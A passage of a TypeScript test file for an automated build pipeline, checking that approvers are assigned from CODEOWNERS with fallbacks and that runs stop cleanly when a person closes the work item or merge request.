  expect(assignedTo(await runBuildPipeline(w))).toEqual(["approver"]);
});
test("a code owner the host does not know is skipped", async () => {
  const w = medium({ files: { CODEOWNERS: "src/ @ghost @owner" } });
  w.tracker.trusted = async (a) => { if (a === "ghost") throw new Error("404 User Not Found"); return true; };
  expect(assignedTo(await runBuildPipeline(w))).toEqual(["owner"]);
});
test("no CODEOWNERS, only groups, or no rule for the changed files goes to the default approver", async () => {
  for (const files of [undefined, { CODEOWNERS: "src/ @org/team a@b.c" }, { CODEOWNERS: "docs/ @owner" }]) {
    expect(assignedTo(await runBuildPipeline(medium({ files })))).toEqual(["approver"]);
  }
});
test("a ticket assignee wins over the code owner", async () => {
  const w = medium({ files: { CODEOWNERS: "src/ @owner" } });
  w.tracker.tickets.get("8")!.assignees = ["alice"];
  await runBuildPipeline(w);
  expect(assignedTo(w)).toEqual(["alice"]);
});
test("a failed CODEOWNERS read or diff read goes to the default approver and does not stop the run", async () => {
  const a = medium({ files: { CODEOWNERS: "src/ @owner" } });
  a.host.readFile = async () => { throw new Error("HTTP 500"); };
  expect(assignedTo(await runBuildPipeline(a))).toEqual(["approver"]);
  expect(a.states).toEqual(["needs_approval"]);
  const b = medium({ files: { CODEOWNERS: "src/ @owner" } });
  b.host.branchDiff = async () => { throw new Error("diff too large"); };
  expect(assignedTo(await runBuildPipeline(b))).toEqual(["approver"]);
  expect(b.states).toEqual(["needs_approval"]);
});

// Part C: a person closes the work item or the merge request while a run is on.
const CLOSED_NOTE = "This merge request was closed because a person closed work item #8.";
const ends = (w: ReturnType<typeof fakeWorld>) => (w.ctx.dashboard as ReturnType<typeof fakeDashboard>).events.filter((e) => e.type === "run_end").map((e) => e.data.outcome);
// The author run polls its inbox once, as the tool hook would, and stops on a stop. before: what happens first.
function pollingAuthor(w: ReturnType<typeof fakeWorld>, before: () => void = () => {}) {
  const run = w.harness.run;
  w.harness.run = async (job) => {
    if (!job.inbox) return run(job);
    before();
    return (await job.inbox.poll()).stop ? { ...(await run(job)), session: "sess-c", ok: false, stopped: true } : run(job);
  };
}
test("a person closes the work item while the author runs: the run ends closed, with no state, and its open change is closed with a comment", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.openChange(); // an open change of the ticket
  pollingAuthor(w, () => void (w.tracker.tickets.get("8")!.open = false));
  w.ctx.dashboard = fakeDashboard();
  await runBuildPipeline(w);
  expect(w.states).toEqual([]);
  expect(w.tracker.cleared).toEqual(["8"]);
  expect(w.workItemComments.some((c) => /Stopped run/.test(c))).toBe(false);
  expect(w.host.changes.get("5")!.open).toBe(false);
  expect(w.mrComments).toEqual([CLOSED_NOTE]);
  expect(ends(w)).toEqual(["closed"]);
  expect(w.finishTriggered).toBe(false);
});
test("a person closes the merge request before the decision step: the ticket is blocked and nothing merges", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  const ask = w.judge.ask;
  w.judge.ask = async (s, q) => (q.some((x) => x.id === "diff_risk") && w.host.close("5"), ask(s, q));
  await runBuildPipeline(w);
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("The merge request https://host.example/changes/5 was closed without a merge.");
  expect(w.finishTriggered).toBe(false);
});
test("a work item closed before the gate's push: nothing is pushed and the run ends closed", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  const run = w.harness.run;
  w.harness.run = async (job) => (job.role === "reviewer" && (w.tracker.tickets.get("8")!.open = false), run(job));
  w.ctx.dashboard = fakeDashboard();
  await runBuildPipeline(w);
  expect(w.commitMessage).toBe("");
  expect(w.mrOpened).toBe(false);
  expect(w.states).toEqual([]);
  expect(ends(w)).toEqual(["closed"]);
});
// Review Focus 2: every decision reads the live state when it acts.
test("a work item closed and opened again before the gate's push goes on", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  const t = w.tracker.tickets.get("8")!;
  const run = w.harness.run;
  w.harness.run = async (job) => (job.role === "reviewer" && (t.open = false), run(job));
  const repoRun = w.ctx.repo.run;
  w.ctx.repo.run = async (cmd) => ((t.open = true), repoRun(cmd)); // opened again while the gate runs
  await runBuildPipeline(w);
  expect(w.mrOpened).toBe(true);
  expect(w.finishTriggered).toBe(true);
});
// Review Focus 1: the factory closes the ticket itself.
test("the factory's own close never ends a run: result-saved ends done, and a merged change never counts", async () => {
  const w = await runFinishPipeline(fakeWorld());
  expect(w.states).toEqual(["done"]);
  expect(await endIfClosed(w.ctx)).toBeUndefined();
  // Between the merge and result-saved the ticket is closed and running, and its change is merged.
  w.tracker.tickets.get("8")!.state = "running";
  expect(await endIfClosed(w.ctx)).toBeUndefined();
  expect(w.tracker.cleared).toEqual([]);
});
// Regression: an older run's change stays the newest one on the branch until this run pushes.
test("a new run after a dashboard restart closed the old change is not blocked", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped" });
  w.openChange();
  await w.tracker.comment("8", stoppedNote({ run: "1", step: "apply", reason: "switch off apply", change: "5", buildRun: "1" }));
  const request = restartRequest("run-1");
  w.ctx.dashboard = fakeDashboard({ requests: [request] });
  await handleRequests(w.ctx);
  expect(w.host.changes.get("5")!.open).toBe(false); // closeStoppedChange
  request.outcome = "done";
  w.tracker.startedBy = async () => BOT;
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8" };
  pollingAuthor(w);
  await runBuildPipeline(w);
  expect(w.states).not.toContain("blocked");
  expect(w.finishTriggered).toBe(true);
});
// An older run's merged change stays the newest on the branch until this run pushes.
test("a work item closed before the push ends the run even when an older run's change merged", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.openChange();
  w.host.mergeByPerson("5");
  pollingAuthor(w, () => void (w.tracker.tickets.get("8")!.open = false));
  w.ctx.dashboard = fakeDashboard();
  await runBuildPipeline(w);
  expect(ends(w)).toEqual(["closed"]);
  expect(w.tracker.cleared).toEqual(["8"]);
  expect(w.commitMessage).toBe(""); // nothing pushed
});
test("a ticket whose old change a person closed runs again and is not blocked before its push", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.openChange();
  w.host.close("5");
  pollingAuthor(w);
  await runBuildPipeline(w);
  expect(w.states).not.toContain("blocked");
  expect(w.mrOpened || w.host.changes.get("5")!.open).toBe(true);
  expect(w.finishTriggered).toBe(true);
});
